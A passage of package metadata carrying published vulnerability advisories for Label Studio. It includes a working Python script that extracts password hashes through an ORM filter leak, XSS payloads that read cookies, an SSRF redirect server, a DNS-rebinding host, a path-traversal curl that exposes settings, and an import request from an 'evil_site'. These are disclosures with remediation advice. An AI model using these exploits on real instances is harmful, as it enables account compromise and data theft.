to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.4.4":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.4/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.2.4)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (==4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","murmurhash (==1.0.2)","numpy (==1.17.4)","plac (==0.9.6)","preshed (==2.0.1)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (==0.0.3)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.4.4","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"0be8ee04ab40e8eade4a70c446c88e3f5cf1d479cf62d13dd8880ef6c7848e87","md5":"653ec3677537742d128116949d64c7bd","sha256":"b136741eb28ad79999713eba2dcf54e8cea1dfccd32d42f1d7bc02cba6751393"},"downloads":-1,"filename":"label_studio-0.4.4-py3-none-any.whl","has_sig":false,"md5_digest":"653ec3677537742d128116949d64c7bd","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":7170696,"upload_time":"2020-01-22T10:12:03","upload_time_iso_8601":"2020-01-22T10:12:03.581194Z","url":"https://files.pythonhosted.org/packages/0b/e8/ee04ab40e8eade4a70c446c88e3f5cf1d479cf62d13dd8880ef6c7848e87/label_studio-0.4.4-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"81aea590b77c5d5630bc67f8c4cbd3626e0f12aff754ee370a115583f2df96a0","md5":"b5c2cca221b91a13f27aaa10f8b2ca0f","sha256":"930b47f79d306ee98b5e6eb879c2ebd1796f0e72e411eaf166c724f29196e76d"},"downloads":-1,"filename":"label-studio-0.4.4.tar.gz","has_sig":false,"md5_digest":"b5c2cca221b91a13f27aaa10f8b2ca0f","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":7106923,"upload_time":"2020-01-22T10:12:24","upload_time_iso_8601":"2020-01-22T10:12:24.258779Z","url":"https://files.pythonhosted.org/packages/81/ae/a590b77c5d5630bc67f8c4cbd3626e0f12aff754ee370a115583f2df96a0/label-studio-0.4.4.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That 